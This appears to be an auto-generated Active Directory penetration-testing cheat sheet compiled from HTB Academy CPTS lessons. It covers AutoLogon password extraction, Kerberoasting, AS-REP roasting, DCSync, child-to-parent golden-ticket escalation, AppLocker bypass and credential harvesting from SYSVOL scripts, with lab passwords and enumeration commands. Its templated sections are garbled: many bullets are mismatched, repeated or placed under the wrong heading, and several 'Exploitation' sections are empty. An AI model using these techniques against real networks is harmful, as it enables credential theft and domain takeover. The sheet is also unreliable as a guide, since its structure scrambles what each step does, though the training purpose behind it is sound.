<a id="technique-windows-autologon"></a>
## Windows AutoLogon

Aliases: —  
Tags: credential, password  
Category: Windows Privilege Escalation / Further Credential Theft  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Windows Autologon is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup.
- Enumerating Autologon with reg.exe Note: If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

### Prerequisites

- This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.
- A value of "1" means it is enabled.
- Enumerating Autologon with reg.exe Note: If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

### Enumeration / Detection

```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

### Exploitation

# 7. Active Directory

<a id="technique-a-note-on-encryption-types"></a>
## A Note on Encryption Types

Aliases: —  
Tags: attack, crack, domain, hash, hashcat, kerberoast, kerberos, ldap, password, ticket  
Category: Active Directory / Kerberoasting - from Windows  
OS: Linux, Windows  
Service: LDAP, kerberos  
Ports: 88, 389, 636, 3268, 3269

### Remember this attack when

- Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests.
- When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$, an RC4 (type 23) encrypted ticket.
- While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.

### Prerequisites

- Requesting a New Ticket To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) per the handy Hashcat examplehashes table.

### What success looks like

- As we can see, we received the TGS ticket RC4 (type 23) encrypted.
- Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0.
- By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

<a id="technique-access-control-list-acl-overview"></a>
## Access Control List (ACL) Overview

Aliases: —  
Tags: abuse, acl, password  
Category: Active Directory / Access Control List (ACL) Abuse Primer  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- DACLs are made up of ACEs that either allow or deny access.
- When someone attempts to access an object, the system will check the DACL for the level of access that is permitted.
- If a DACL does not exist for an object, all who attempt to access the object are granted full rights.

### Prerequisites

- In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.
- Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object.
- If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.
- The settings themselves in an ACL are called Access Control Entries (ACEs).
- Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD.

<a id="technique-active-directory-quick-hits-smb-null-session"></a>
## Active Directory Quick Hits - SMB NULL SESSION

Aliases: —  
Tags: attack, domain, dump, host, password, smb  
Category: Active Directory / Internal Information Gathering  
OS: Linux, Windows  
Service: SMB  
Ports: 139, 445

### Remember this attack when

- If we can dump the password policy and a user list, we could try a measured password spraying attack.
- If we know the password policy, we can time our attacks appropriately to avoid account lockout.
- If we can't find anything else, we could come back and use Kerbrute to enumerate valid usernames from various user lists and after enumerating (during a real pentest) potential usernames from the company's LinkedIn page.

<a id="technique-activedirectory-powershell-module"></a>
## ActiveDirectory PowerShell Module

Aliases: —  
Tags: discover, domain, powershell  
Category: Active Directory / Credentialed Enumeration - from Windows  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- This is a great way to see if anything like Git or custom administrator scripts are installed.
- If the module is not loaded, run Import-Module ActiveDirectory to load it for use.
- Discover Modules We'll see that the ActiveDirectory module is not yet imported.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```powershell-session
PS C:\htb> Get-Module

```


### What success looks like

- The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
- Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.
- The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Credentialed Enumeration - from Windows` → re-enumerate with the gained access.

<a id="technique-admin-password-re-use-group-membership"></a>
## Admin Password Re-Use & Group Membership

Aliases: —  
Tags: abuse, credential, dns, domain, host, password, winrm  
Category: Active Directory / Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows  
OS: Windows  
Service: DNS, winrm  
Ports: 53, 5985, 5986

### Remember this attack when

- Only Domain Local Groups allow security principals from outside its forest.
- If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
- This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

### Prerequisites

- If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

### Enumeration / Detection

### Exploitation


### What success looks like

- If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
- Using Get-DomainForeignGroupMember The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member.
- We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows` → re-enumerate with the gained access.

### Common problems / Why it fails

- I occasionally ran into issues where, for example, Domain A would have a user named admbob.smith in the Domain Admins group, and Domain B had a user named bsmithadmin.

## Am I Alone?

Aliases: —  
Tags: domain, host, password, rdp  
Category: Active Directory / Living Off the Land  
OS: Windows  
Service: RDP  
Ports: 3389

### Remember this attack when

- When landing on a host for the first time, one important thing is to check and see if you are the only one logged in.
- If you start taking actions from a host someone else is on, there is the potential for them to notice you.
- If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

<a id="technique-applocker"></a>
## AppLocker

Aliases: —  
Tags: bypass, domain, powershell  
Category: Active Directory / Enumerating Security Controls  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.
- All Domain Users are disallowed from running the 64-bit PowerShell executable located at: %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe So, we can merely call it from other locations.

### Prerequisites

- It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed.
- Sometimes, we run into more stringent AppLocker policies that require more creativity to bypass.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation


### What success looks like

- It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed.
- Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShellISE.exe.
- We can see that this is the case in the AppLocker rules shown below.

<a id="technique-as-rep-roasting"></a>
## AS-REP Roasting

Aliases: ASREPRoast, AS-REP roast, UF_DONT_REQUIRE_PREAUTH, ASREPRoasting  
Tags: attack, domain, hash, hashcat, john, kerberos, ldap, password, powershell, service, ticket  
Category: Active Directory / Miscellaneous Misconfigurations  
OS: Linux, Windows  
Service: LDAP, kerberos  
Ports: 88, 389, 636, 3268, 3269

### Remember this attack when

- If successful, a TGT will be issued to the user for further authentication requests in the domain.
- If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.
- If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again.

### Prerequisites

- It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled.
- Viewing an Account with the Do not Require Kerberos Preauthentication Option Active Directory Users and Computers showing Matthew Morgan's account properties with Kerberos encryption options.
- If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again.

### Enumeration / Detection

```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

### What success looks like

- If successful, a TGT will be issued to the user for further authentication requests in the domain.

- Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Miscellaneous Misconfigurations` → re-enumerate with the gained access.

### Common problems / Why it fails

- If successful, a TGT will be issued to the user for further authentication requests in the domain.
- If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.
- Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.

### Variants

- ASREPRoast, AS-REP roast, UF_DONT_REQUIRE_PREAUTH, ASREPRoasting

<a id="technique-attacking-active-directory-and-ntds-dit"></a>
## Attacking Active Directory and NTDS.dit

Aliases: —  
Tags: attack, domain, forward, kerberos, password, port, service  
Category: Active Directory / Attacking Active Directory and NTDS.dit  
OS: Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems.
- That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on.
- It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network.

### Prerequisites

- AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack and defend these environments.
- In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
- Like many of the attacks we have covered thus far, our target must be reachable over the network.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network.
- Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01\nameofuser) or with direct access to the device then typing .\ at the logon UI in the Username field.
- It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network.

<a id="technique-attacking-domain-trusts-child-parent-trusts-from-linux"></a>
## Attacking Domain Trusts - Child -> Parent Trusts - from Linux

Aliases: —  
Tags: attack, brute, dcsync, domain, hash, host, kerberos, password  
Category: Active Directory / Attacking Domain Trusts - Child -> Parent Trusts - from Linux  
OS: Cross-platform, Linux, Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- Performing DCSync with secretsdump.py Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain.
- Setting the KRB5CCNAME Environment Variable We can check if we can successfully authenticate to the parent domain's Domain Controller using Impacket's version of Psexec.
- If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

### Prerequisites

- Constructing a Golden Ticket using ticketer.py The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials.
- We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.

### Enumeration / Detection

```python
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

```python
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

```powershell-session
    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
```

<a id="technique-background"></a>
## Background

Aliases: —  
Tags: credential, domain, hash, host, kerberos, ldap, password, powershell, shell, smb, ticket, winrm  
Category: Active Directory / Kerberos "Double Hop" Problem  
OS: Windows  
Service: LDAP, SMB, kerberos, winrm  
Ports: 88, 139, 389, 445, 636, 3268, 3269, 5985, 5986

### Remember this attack when

- The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource.
- This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell.
- The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login.

### Prerequisites

- The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec.
- Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.
- If we use Mimikatz to look at the session, we'll see that all credentials are blank.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource.
- This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell.
- In this situation, the user account being used has the rights to perform an action but is denied access.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Kerberos "Double Hop" Problem` → re-enumerate with the gained access.

### Common problems / Why it fails

- The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource.
- This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell.
- The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login.

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-bloodhound"></a>
## BloodHound

Aliases: —  
Tags: acl, attack, bloodhound, discover, domain, host, http, ldap, rdp, transfer, winrm  
Category: Active Directory / Credentialed Enumeration - from Windows  
OS: Cross-platform, Linux, Windows  
Service: HTTP, LDAP, RDP, winrm  
Ports: 80, 389, 636, 3268, 3269, 3389, 5985, 5986

### Remember this attack when

- As discussed in the previous section, Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects.
- When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.
- If we run SharpHound with the --help option, we can see the options available to us.

### Prerequisites

- First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.
- The credentials should be saved, but enter neo4j: HTB@cademystdnt!
- Unsupported Operating Systems BloodHound interface showing node info for ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL with details like sessions, reachable targets, and node properties.

### Enumeration / Detection

### What success looks like

- If we run SharpHound with the --help option, we can see the options available to us.
- We can do this on MS01 by typing bloodhound into a CMD or PowerShell console.
- As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Credentialed Enumeration - from Windows` → re-enumerate with the gained access.

### Common problems / Why it fails

- These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet.
- We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-bloodhound-py"></a>
## Bloodhound.py

Aliases: —  
Tags: attack, bloodhound, dns, domain, host, ldap, port, powershell, rdp, upload, winrm  
Category: Active Directory / Credentialed Enumeration - from Linux  
OS: Cross-platform, Linux, Windows  
Service: DNS, LDAP, RDP, winrm  
Ports: 53, 389, 636, 3268, 3269, 3389, 5985, 5986

### Remember this attack when

- BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers.
- We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues.
- The tool consists of two parts: the SharpHound collector written in C for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.

### Prerequisites

- Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host.
- Eventually, a Python port (which requires Impacket, ldap3, and dnspython) was released by a community member.
- This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from.

### Enumeration / Detection

```shell-session
[!bash!]$ ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
```

### Exploitation

```shell-session
[!bash!]$ bloodhound-python -h

usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]
                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]
                         [--disable-pooling] [--disable-autogc] [--zip]

Python based ingestor for BloodHound
For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py

optional arguments:

  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
                        Which information to collect. Supported: Group,

                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
                        You can specify more than one by separating them with
                        a comma. (default: Default)
  -u USERNAME, --username USERNAME
                        Username. Format: username[@domain]; If the domain is
                        unspecified, the current domain is used.
  -p PASSWORD, --password PASSWORD
                        Password

  <SNIP>
```

```shell-session
[!bash!]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

<SNIP>
```

### What success looks like

- We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead.
- The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.
- It was initially only released with a PowerShell collector, so it had to be run from a Windows host.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Credentialed Enumeration - from Linux` → re-enumerate with the gained access.

### Common problems / Why it fails

- We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues.
- This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).
- It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-capturing-ntds-dit"></a>
## Capturing NTDS.dit

Aliases: —  
Tags: attack, domain, host, password, powershell, service, smb, winrm  
Category: Active Directory / Attacking Active Directory and NTDS.dit  
OS: Linux, Windows  
Service: SMB, winrm  
Ports: 139, 445, 5985, 5986

### Remember this attack when

- NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources.
- If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM, SYSTEM, and SECURITY section.
- We can start with looking at the local group membership using the command: We are looking to see if the account has local admin rights.

### Prerequisites

- Connecting to a DC with Evil-WinRM We can connect to a target DC using the credentials we captured.
- Checking local group membership Once connected, we can check to see what privileges bwilliamson has.
- To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.

## Checking Defenses

Aliases: —  
Tags: domain, host, powershell  
Category: Active Directory / Living Off the Land  
OS: Cross-platform, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
- Firewall Checks Windows Defender Check (from CMD.exe) Above, we checked if Defender was running.
- We can tell how often scans are run, if the on-demand threat alerting is active, and more.

### Prerequisites

- Get-MpComputerStatus Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us.
- Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals.

<a id="technique-cleaning-up-active-directory"></a>
## Cleaning Up — Active Directory

Aliases: —  
Tags: attack, dns, domain, host, service  
Category: Active Directory / DnsAdmins  
OS: Windows  
Service: DNS  
Ports: 53

### Remember this attack when

- If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.
- Checking DNS Service Status If everything went to plan, querying the DNS service will show that it is running.
- If they understand the risks and want to see a full proof of concept, then the steps outlined in this section will help demonstrate the attack and clean up afterward.

### Prerequisites

- Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care.
- As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues.
- If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.

### Enumeration / Detection

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

```

<a id="technique-crackmapexec"></a>
## CrackMapExec

Aliases: —  
Tags: credential, domain, hash, host, http, https, kerberos, mssql, nmap, password, port, smb, ssh, winrm  
Category: Active Directory / Credentialed Enumeration - from Linux  
OS: Cross-platform, Linux, Windows  
Service: HTTP, HTTPS, SMB, SSH, kerberos, mssql, winrm  
Ports: 22, 80, 88, 139, 443, 445, 1433, 5985, 5986

### Remember this attack when

- Notice when it provides us the user information, it includes data points such as the badPwdCount attribute.
- This is helpful when performing actions like targeted password spraying.
- It could be an easy win if we can steal this user's credentials from memory or impersonate them.

### Prerequisites

- CME Help Menu We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials.
- CME - Domain User Enumeration We start by pointing CME at the Domain Controller and using the credentials for the forend user to retrieve a list of all domain users.
- Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc.

## Credentials in SMB Shares and SYSVOL Scripts

Aliases: —  
Tags: domain, password, powershell, shell, smb  
Category: Active Directory / Miscellaneous Misconfigurations  
OS: Linux, Windows  
Service: SMB  
Ports: 139, 445

### Remember this attack when

- We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain.
- Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory.
- Discovering an Interesting Script Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```powershell-session
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

```powershell-session
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

<a id="technique-cross-forest-kerberoasting"></a>
## Cross-Forest Kerberoasting

Aliases: —  
Tags: abuse, attack, crack, domain, hash, hashcat, kerberoast, kerberos, ldap, password, service, spray, ticket  
Category: Active Directory / Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows; Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux  
OS: Linux, Windows  
Service: LDAP, kerberos  
Ports: 88, 389, 636, 3268, 3269

### Remember this attack when

- A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
- If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.
- If successful, we'd be able to authenticate into the FREIGHTLOGISTICS.LOCAL domain as a Domain Admin.

### Prerequisites

- Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
- If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

### Enumeration / Detection

```powershell-session
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

```powershell-session
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

### Exploitation

<a id="technique-dcsync"></a>
## DCSync

Aliases: DS-Replication-Get-Changes, secretsdump, What is DCSync and How Does it Work?  
Tags: attack, dcsync, domain, dump, hash, host, kerberos, ldap, password, rpc, service  
Category: Active Directory / DCSync  
OS: Cross-platform, Linux, Windows  
Service: LDAP, RPC, kerberos  
Ports: 88, 111, 135, 389, 636, 3268, 3269

### Remember this attack when

- This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
- This is an extended access control right within AD, which allows for the replication of secret data.
- It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords.

### Prerequisites

- ---- Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain.
- To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set).
- Viewing adunn's Replication Privileges through ADSI Edit ADSI Edit window showing DC=INLANEFREIGHT,DC=LOCAL properties with user Angela Dunn selected, displaying permissions for directory changes.

### What success looks like

- This is an extended access control right within AD, which allows for the replication of secret data.
- It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords.
- The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `DCSync` → re-enumerate with the gained access.

### Common problems / Why it fails

- The -user-status is another helpful flag to check and see if a user is disabled.
- If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption.

### Variants

- DS-Replication-Get-Changes, secretsdump, What is DCSync and How Does it Work?

<a id="technique-detailed-user-enumeration"></a>
## Detailed User Enumeration

Aliases: —  
Tags: attack, domain, ldap, password, smb, spray  
Category: Active Directory / Password Spraying - Making a Target User List  
OS: Linux, Windows  
Service: LDAP, SMB  
Ports: 139, 389, 445, 636, 3268, 3269

### Remember this attack when

- If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
- Again, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a "hail mary" if all other options for a foothold have been exhausted.
- If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.

### Prerequisites

- To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with.
- If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
